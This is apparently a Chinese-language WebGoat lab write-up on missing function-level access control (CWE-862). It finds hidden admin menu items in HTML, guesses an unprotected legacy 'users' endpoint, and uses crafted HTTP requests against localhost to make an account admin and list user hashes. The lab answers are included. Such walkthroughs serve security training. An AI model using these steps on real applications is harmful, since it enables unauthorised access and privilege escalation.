---
title: Missing Function Level Access Control
id: CWE-862
---
<!-- muse start -->
旧版敏感功能端点未实施授权校验且未下线，修复的新版敏感功能仅设置为不可见，从中推测旧版端点地址后导致信息泄露与权限提升。
探索代码获取隐藏端点地址（此处为HTML的类），访问隐藏端点并基于当前信息推测陈旧版本端点地址（由users-admin-fix 推测到 users）。
修改方法并添加端点接受的头部访问新旧端点，在旧端点获得信息并提升权限后访问新端点获得最新信息。
<!-- muse end -->

概念：
缺少函数级访问控制
访问控制（例如，通过输出编码来防止XSS攻击）在维护上可能比较棘手。必须确保它在整个应用程序中得到充分执行，即在每个方法或函数中都要到位。

- 依赖隐蔽性
    人们可能会依赖HTML、CSS或JavaScript来隐藏用户通常无法访问的链接。过去，某网络路由器曾尝试通过用户界面中的JavaScript来保护（隐藏）管理功能：https://www.wired.com/2009/10/routers-still-vulnerable。

    查找隐藏项
    通常存在一些线索可以帮助发现用户界面未公开暴露的功能，这些线索存在于：

    -   HTML或JavaScript注释中
    -   被注释掉的元素中
    -   通过CSS控件/类隐藏的项目中

    你的任务
    在下方的菜单中找到两个对攻击者/恶意用户有吸引力或可能感兴趣的不可见菜单项，并提交这些菜单项的标签（目前菜单中暂无实际链接）。

    查看HTML代码得到隐藏项
    ```html
    <li class="hidden-menu-item dropdown">
        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Admin<span class="caret"></span></a>
        <ul class="dropdown-menu" aria-labelledby="admin">
            <li><a href="access-control/users-admin-fix">Users</a></li>
            <li><a href="access-control/config">Config</a></li>
        </ul>
    </li>
    ```
    输入 `Users` 与 `Config`

- 请按照上一页所述进行尝试。
    有时，应用程序依赖客户端控件来控制访问（这是一种“隐蔽性”安全措施）。如果您能找到那些不可见的项目，请尝试操作它们，看看会发生什么。是的，有时候就是这么简单！

    收集用户信息
    通常，数据泄露源于SQL注入等漏洞，但也可能来自不完善或缺失的访问控制。
    首先，利用您已经收集到的信息（例如，找到隐藏的菜单项），看看是否能获取用户列表，然后提供jerry账户的“哈希值”。

    请求行
    `GET http://localhost:3000/WebGoat/access-control/users-admin-fix HTTP/1.1`
    响应为
    ```
    Accept: application/json

    Unsupported Media Type
    ```

    修改方法为 `POST`，并设置请求体为 JSON 
    ```http
    POST http://localhost:3000/WebGoat/access-control/users-admin-fix HTTP/1.1
    Content-Type: application/json

    {}
    ```
    响应为
    ```json
    {
        "username" : null,
        "password" : null,
        "admin" : false
    }
    ```

    修改请求体为
    ```json
    {
    "username" : "testfoo",
    "password" : "barbarbar",
    "admin" : true
    }
    ```
    得到相同响应

    
    继续修改请求行，访问 `users` 端点
    ```http
    POST http://localhost:3000/WebGoat/access-control/users HTTP/1.1
    Content-Type: application/json
    ```
    响应与之前的 `users-admin-fix` 端点相同

    转为 `GET` 方法
    ```http
    GET http://localhost:3000/WebGoat/access-control/users HTTP/1.1
    Content-Type: application/json
    ```
    响应为用户信息 JSON，若请求去掉 `Content-Type: application/json` 则返回错误信息
    ```json
    [{
        "username": "Tom",
        "admin": false,
        "userHash": "Mydnhcy00j2b0m6SjmPz6PUxF9WIeO7tzm665GiZWCo="
    }, {
        "username": "Jerry",
        "admin": true,
        "userHash": "SVtOlaa+ER+w2eoIIVE5/77umvhcsh5V8UyDLUa1Itg="
    }, {
        "username": "Sylvester",
        "admin": false,
        "userHash": "B5zhk70ZfZluvQ4smRl4nqCvdOTggMZtKS3TtTqIed0="
    }]
    ```

- 他们发现某个端点的开放权限过大，并为此进行了紧急修复。现在，只有管理员用户能够列出所有用户。
    请利用您已收集到的信息（例如隐藏的菜单项），尝试获取用户列表，然后提供Jerry账户的哈希值。

    使用之前创建账户以及设置管理员权限的功能，将自己当前的账户设置为管理员后
    访问 `users-admin-fix` 端点
    `GET http://localhost:3000/WebGoat/access-control/users-admin-fix HTTP/1.1`
    响应为另一批用户信息
    ```json
    [{
        "username": "Tom",
        "admin": false,
        "userHash": "RIbP+ltDVkKRPGe5qYGkVCjj/BtjNcryiYhlT+ejD/s="
    }, {
        "username": "Jerry",
        "admin": true,
        "userHash": "d4T2ahJN4fWP83s9JdLISio7Auh4mWhFT1Q38S6OewM="
    }, {
        "username": "Sylvester",
        "admin": false,
        "userHash": "iBy1RDvLrUMMpMJHjQsLm/5FLN07NnBtdlOFc845j+A="
    }]
    ```